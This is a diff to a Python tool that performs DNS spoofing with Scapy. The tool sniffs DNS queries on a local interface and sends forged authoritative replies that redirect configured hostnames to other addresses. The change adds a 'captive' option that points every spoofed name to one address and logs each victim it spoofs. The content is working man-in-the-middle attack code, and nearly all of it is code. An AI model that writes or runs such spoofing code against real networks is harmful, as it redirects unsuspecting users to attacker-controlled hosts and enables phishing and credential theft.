@@ -14,13 +14,14 @@ green   = Fore.GREEN
 magenta = Fore.MAGENTA
 
 class DNSSpoof(object):
-    def __init__(self,verbose=False,targets=""):
+    def __init__(self,verbose=False,targets="",captive=""):
         self.main_thread = None
         self.interface   = "eth0"
         self.iface_info  = netifaces.ifaddresses(self.interface)
         self.local_ip    = self.iface_info[netifaces.AF_INET][0]['addr']
         self.local_mac   = self.iface_info[netifaces.AF_LINK][0]['addr']
-        self.targets	= list(targets.split("/"))
+        self.targets	 = list(targets.split("/"))
+        self.captive     = captive
 
         init()
         logging.addLevelName(logging.CRITICAL, f"[{red}!!{reset}]")
@@ -40,6 +41,7 @@ class DNSSpoof(object):
                 conf = self.config()
                 if pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and pkt[DNSQR].qname.decode() in list(conf.keys()):
                     name     = pkt[DNSQR].qname.decode()
+                    redirect = conf[name] if not self.captive else self.captive
                     fake_pkt = IP(dst=pkt[IP].src,
                                 src=pkt[IP].dst)/\
                                 UDP(dport=pkt[UDP].sport,sport=53)/\
@@ -48,12 +50,12 @@ class DNSSpoof(object):
                                     aa=1,
                                     qr=1,
                                     ancount=1,
-                                    an=DNSRR(rrname=pkt[DNSQR].qname, rdata=conf[name]))/\
+                                    an=DNSRR(rrname=pkt[DNSQR].qname, rdata=redirect))/\
                                 DNSRR(
                                     rrname=pkt[DNSQR].qname,
-                                    rdata=conf[name])
+                                    rdata=redirect)
                     send(fake_pkt)
-                    logging.debug(f"DNS: Spoofed request from {pkt[IP].src} for {name} to {conf[name]}")
+                    logging.debug(f"DNS: Spoofed request from {pkt[IP].src} for {name} to {redirect}")
 
     def sniff_thread(self):
         filter_ = ""
